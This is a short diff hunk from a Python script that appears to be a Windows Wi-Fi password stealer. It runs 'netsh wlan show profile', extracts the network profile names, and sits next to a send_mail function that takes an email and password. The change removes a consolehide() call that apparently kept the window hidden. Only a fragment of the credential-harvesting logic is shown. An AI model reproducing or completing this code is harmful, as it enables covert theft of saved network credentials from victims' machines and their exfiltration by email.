@@ -13,7 +13,7 @@ def send_mail(email, password, message):
 
 command = "netsh wlan show profile"
 
-consolehide()
+
 networks = subprocess.check_output(command, shell=True)
 network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
 
